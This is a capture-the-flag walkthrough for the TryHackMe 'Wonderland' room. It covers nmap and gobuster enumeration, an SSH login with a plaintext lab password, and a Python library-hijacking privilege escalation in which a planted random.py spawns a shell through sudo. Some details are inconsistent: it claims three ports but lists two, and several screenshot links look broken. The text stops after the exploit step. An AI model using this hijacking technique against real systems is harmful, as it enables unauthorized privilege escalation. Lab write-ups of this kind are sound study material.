# Wonderland Room ; https://tryhackme.com/room/wonderland

## Overview

This walkthrough demonstrates how the **Wonderland** challenge on TryHackMe was solved. The room simulates a realistic penetration testing scenario in a legal and controlled Capture The Flag (CTF) environment.

---

## Reconnaissance

The first step was to identify the open services running on the target machine.

### Nmap Scan

```bash
sudo nmap -sS -sV <TARGET_IP>
````

The scan revealed three open ports:

| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |

![Nmap Scan](Screenshots/Scan_Network_Nmap.png)

Since web services were available, the next step was to investigate the website.

---

## Web Enumeration

After opening the target in a browser, the homepage displayed only a image and a message.

![Homepage](Screenshots/http_Of_IP.png)

we see an ambogies sentince "Follow the White Rabbit".

### Directory Enumeration

We used gobuster to enumerate hidden directories:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

![Dirb Results](Screenshots/dirb_subdomains.png)

Several interesting paths were discovered:

```text
/r
```

if repated this url with add subdomain /r then /a the char of word rabbit in the same sort we will get : http://<TARGET_IP>/r/a/b/b/i/t
then open the source code of this page; I'm finding a username and password for account

![img](Screenshots/fvf)

Alternatively:

```bash
dirb http://<TARGET_IP>
```
---

## connect by SSH

after get the username and password 

```bash
ssh alice@<TARGET_IP>
password : HowDothTheLittleCrocodileImproveHisShiningTail
```

![img](Screenshots/fvf)

----

## Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Thing useful was found.
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
we can use python3.6 by user rabbit without password

![img](Screenshots/fvf)

now how to exploit :
Read file "/home/alice/walrus_and_the_carpenter.py" at first. 
at first line can see "import random" this is very important thing because when python import liberary that search at first at the same path "/home/alice/???"

so create file with same name type python 

```bash
nano random.py
```

the exploit code inside it 

```python
import os
os.system("/bin/bash")
```


---
